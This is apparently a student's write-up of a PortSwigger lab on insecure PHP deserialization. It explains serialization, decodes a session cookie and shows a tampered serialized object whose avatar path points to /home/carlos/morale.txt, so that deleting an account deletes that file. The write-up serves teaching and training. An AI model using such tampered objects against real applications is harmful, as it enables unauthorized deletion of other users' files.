
# Table of Contents

1.  [Lab](#orgce92acd)
    1.  [Objective](#orged0fac3)
2.  [What is serialization ?](#orgf1afee9)
        1.  [Serialization vs Deserialization](#org2952292)
3.  [Deserialized object](#org58ec48d)
4.  [Customized object](#org8350694)



<a id="orgce92acd"></a>

# Lab

<https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization>

-   Credentials:
    wiener:peter


<a id="orged0fac3"></a>

## Objective

-   Delete file at /home directory of Carlos user
-   Do that with modifications at deserialized object from Cookie


<a id="orgf1afee9"></a>

# What is serialization ?

Serialization is the process of converting complex data structures, such as objects and their fields, into a &ldquo;flatter&rdquo; format that can be sent and received as a sequential stream of bytes.

Crucially, when serializing an object, its state is also persisted. In other words, the object&rsquo;s attributes are preserved, along with their assigned values.


<a id="org2952292"></a>

### Serialization vs Deserialization

Deserialization is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.

The website&rsquo;s logic can then interact with this deserialized object, just like it would with any other object.


<a id="org58ec48d"></a>

# Deserialized object

-   At web page lab, CTRL + SHIFT + i to open `dev tools`
    -   Get the sessions cookie at `dev tools`
        Application > storage > Cookies
    -   The cookie are Base64 encode, at terminal ->

---

    echo 'Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJoaG5sYWJzZzlpcW1kNTMycXRya3h5eXRxNHQzMXhiYiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=' | base64 -d

-   And we get an deserialized Object ->
    
        O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hhnlabsg9iqmd532qtrkxyytq4t31xbb";s:11:"avatar_link";s:19:"users/wiener/avatar";}

O -> Object
s -> String
s:3 -> string lenght
; -> separator

-   We can modify that object, encode base64 again, and send to web page at our original cookie place, with `dev tools`


<a id="org8350694"></a>

# Customized object

-   Customize the user home path at cookie to carlos /home directory
    
        O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hhnlabsg9iqmd532qtrkxyytq4t31xbb";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
    
    Now when click at delete account func, the deleted account will be carlos account
    
    !

